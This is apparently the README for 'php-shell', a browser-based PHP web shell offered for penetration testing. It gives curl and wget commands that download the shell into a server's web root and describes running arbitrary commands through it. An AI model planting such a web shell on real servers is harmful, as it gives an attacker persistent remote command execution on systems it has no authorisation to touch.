# php-shell
A simple, intuitive, feature rich, php web shell for pen testing.

### Usage

To download use one of the following (or similar)

```bash
curl https://github.com/eb3095/php-shell/raw/master/php-shell.php > /var/www/html/php-shell.php
```

```bash
wget https://github.com/eb3095/php-shell/raw/master/php-shell.php -O /var/www/html
```

From there just visit the website with /php-shell.php at the end and enjoy your web based shell from the host!

### Controls

* Arrow Up: History up
* Arrow Down: History down
* Enter: Run command
* Click Anywhere: Focus command prompt

History is not saved across sessions and is stored locally in the browser for the time being.

### Commands

* exit: Log out
* cd: Change directory
* cls: Clear the screen

cd is unique here. If you do the following,

```bash
cd /home; ls
```

This will be executed as a SH/BASH command. The cd will not set the current working directory outside of the exec. However,

```bash
cd /home
```

This will be executed as an internal command setting the PHP cwd and it is permanent (until refresh).